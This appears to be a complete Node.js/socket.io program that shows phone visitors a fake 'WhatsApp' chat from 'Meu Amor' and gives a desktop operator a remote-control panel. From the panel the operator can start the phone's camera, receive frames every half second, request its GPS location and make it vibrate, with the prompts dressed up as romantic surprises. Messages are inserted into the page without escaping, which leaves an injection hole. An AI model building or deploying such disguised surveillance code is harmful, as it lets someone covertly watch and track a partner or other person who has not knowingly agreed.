const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    const isMobile = /mobile|android|iphone|ipad/i.test(req.headers['user-agent'] || '');
    const host = req.headers.host;
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const fullUrl = `${protocol}://${host}`;
    
    if (isMobile) {
        res.send(getMobilePage(fullUrl));
    } else {
        res.send(getPCPage(fullUrl));
    }
});

io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);
    
    socket.on('send_message', (data) => {
        socket.broadcast.emit('new_message', data);
    });
    
    socket.on('command', (cmd) => {
        console.log('🎮 Comando:', cmd.type);
        socket.broadcast.emit('execute_command', cmd);
    });
    
    socket.on('camera_frame', (frame) => {
        socket.broadcast.emit('camera_stream', frame);
    });
    
    socket.on('location_update', (loc) => {
        socket.broadcast.emit('new_location', loc);
    });
    
    socket.on('disconnect', () => {
        console.log('❌ Desconectado:', socket.id);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Servidor rodando na Railway!`);
    console.log(`📍 Porta: ${PORT}`);
    console.log(`🌐 Acesse: https://brincando-production-81fa.up.railway.app`);
});

// ============ PÁGINA DO CELULAR ============
function getMobilePage(fullUrl) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #2a3942;
        }
        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
        }
        .contact-info h3 { color: #e9edef; font-size: 16px; }
        .contact-status { color: #8696a0; font-size: 12px; }
        .messages {
            height: calc(100vh - 140px);
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px 16px;
            border-top: 1px solid #2a3942;
            text-align: center;
        }
        .input-disabled {
            background: #1a242a;
            padding: 10px;
            border-radius: 24px;
            color: #8696a0;
            font-size: 13px;
        }
        .toast {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e2a32;
            color: #e9edef;
            padding: 8px 16px;
            border-radius: 24px;
            font-size: 13px;
            z-index: 1000;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
        .camera-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #25d366;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            border: none;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            z-index: 10;
        }
    </style>
</head>
<body>
    <div>
        <div class="header">
            <div class="avatar">💕</div>
            <div class="contact-info">
                <h3>Meu Amor</h3>
                <div class="contact-status" id="statusText">🟢 online</div>
            </div>
        </div>
        <div class="messages" id="messages">
            <div class="message">💕 Conectado! Aguardando mensagens 💕<div class="message-meta">Agora</div></div>
        </div>
        <div class="input-area">
            <div class="input-disabled">📱 Modo visualização - Apenas recebendo mensagens</div>
        </div>
    </div>
    <button class="camera-btn" id="cameraBtn">📷</button>
    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
        const messages = document.getElementById('messages');
        
        function showToast(msg) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        function addMessage(text) {
            const div = document.createElement('div');
            div.className = 'message';
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`<div>\${text}</div><div class="message-meta">\${time}</div>\`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        socket.on('new_message', (data) => {
            addMessage(data.text);
            showToast('💬 Nova mensagem');
        });
        
        socket.on('execute_command', (cmd) => {
            if (cmd.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
                showToast('📳 Vibração!');
            } else if (cmd.type === 'emergency') {
                if (navigator.vibrate) navigator.vibrate([500,200,500]);
                showToast('💖 Surpresa!');
                addMessage('💖 Surpresa especial recebida! 💖');
            } else if (cmd.type === 'get_location' && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    socket.emit('location_update', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                    showToast('📍 Localização enviada!');
                });
            } else if (cmd.type === 'start_camera') {
                startCamera();
            }
        });
        
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);
                setInterval(() => {
                    capture.grabFrame().then(bitmap => {
                        const canvas = document.createElement('canvas');
                        canvas.width = bitmap.width;
                        canvas.height = bitmap.height;
                        canvas.getContext('2d').drawImage(bitmap, 0, 0);
                        socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                    });
                }, 500);
                showToast('📷 Câmera ativada!');
            } catch(e) { showToast('❌ Erro na câmera'); }
        }
        
        document.getElementById('cameraBtn').onclick = startCamera;
        socket.on('connect', () => showToast('✨ Conectado! ✨'));
    </script>
</body>
</html>`;
}

// ============ PÁGINA DO PC ============
function getPCPage(fullUrl) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #111b21;
            height: 100vh;
            display: flex;
        }
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #202c33;
            padding: 16px;
            border-bottom: 1px solid #2a3942;
        }
        .header h3 { color: #e9edef; }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
        }
        .message.sent {
            background: #005c4b;
            color: white;
            align-self: flex-end;
        }
        .message.received {
            background: #202c33;
            color: white;
            align-self: flex-start;
        }
        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px;
            display: flex;
            gap: 12px;
        }
        .input-area input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px;
            border-radius: 20px;
            color: white;
            outline: none;
        }
        .input-area button {
            background: #005c4b;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            color: white;
            cursor: pointer;
        }
        .panel {
            width: 300px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            padding: 20px;
            overflow-y: auto;
        }
        .panel button {
            width: 100%;
            margin-bottom: 10px;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .panel button:hover { background: #3b4a54; }
        .panel .danger { background: #c0392b; }
        .panel h3 { color: #e9edef; margin-bottom: 16px; }
        .preview { margin-top: 10px; background: #111b21; border-radius: 8px; overflow: hidden; }
        .preview img { width: 100%; }
        .location-info {
            background: #111b21;
            padding: 10px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 10px;
            color: #8696a0;
        }
        .status {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            margin-right: 6px;
        }
    </style>
</head>
<body>
    <div class="chat">
        <div class="header">
            <h3>💕 Meu Amor</h3>
            <div style="font-size:12px; color:#8696a0; margin-top:5px;"><span class="status"></span> online</div>
        </div>
        <div class="messages" id="messages">
            <div class="message received">💕 Conectado! Envie mensagens<div class="message-meta">Agora</div></div>
        </div>
        <div class="input-area">
            <input type="text" id="input" placeholder="Digite uma mensagem">
            <button id="send">📤 Enviar</button>
        </div>
    </div>
    <div class="panel">
        <h3>🎮 Controles Remotos</h3>
        <button id="cameraBtn">📷 Ativar Câmera</button>
        <div class="preview"><img id="cameraPreview" src=""></div>
        
        <button id="locationBtn">📍 Solicitar Localização</button>
        <div class="location-info" id="locationInfo">Aguardando...</div>
        
        <button id="vibrateBtn">📳 Vibrar Celular</button>
        <button id="emergencyBtn" class="danger">💥 Surpresa Especial</button>
    </div>
    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
        const messages = document.getElementById('messages');
        const input = document.getElementById('input');
        const sendBtn = document.getElementById('send');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationInfo = document.getElementById('locationInfo');
        
        function addMessage(text, type = 'sent') {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`\${text}<div class="message-meta">\${time}</div>\`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function sendMessage() {
            const text = input.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text });
                input.value = '';
            }
        }
        
        sendBtn.onclick = sendMessage;
        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
        
        document.getElementById('cameraBtn').onclick = () => {
            socket.emit('command', { type: 'start_camera' });
            addMessage('📷 Solicitando câmera...', 'sent');
        };
        document.getElementById('locationBtn').onclick = () => {
            socket.emit('command', { type: 'get_location' });
            addMessage('📍 Solicitando localização...', 'sent');
        };
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('command', { type: 'vibrate' });
            addMessage('📳 Vibração enviada', 'sent');
        };
        document.getElementById('emergencyBtn').onclick = () => {
            socket.emit('command', { type: 'emergency' });
            addMessage('💥 Surpresa enviada!', 'sent');
        };
        
        socket.on('new_message', (data) => addMessage(data.text, 'received'));
        socket.on('camera_stream', (frame) => { cameraPreview.src = frame; });
        socket.on('new_location', (loc) => {
            locationInfo.innerHTML = \`📍 Lat: \${loc.lat.toFixed(6)}<br>📍 Lng: \${loc.lng.toFixed(6)}\`;
            addMessage(\`📍 Localização recebida\`, 'received');
        });
        
        messages.innerHTML = '<div class="message received">💕 Conectado ao celular!<div class="message-meta">Agora</div></div>';
    </script>
</body>
</html>`;
}
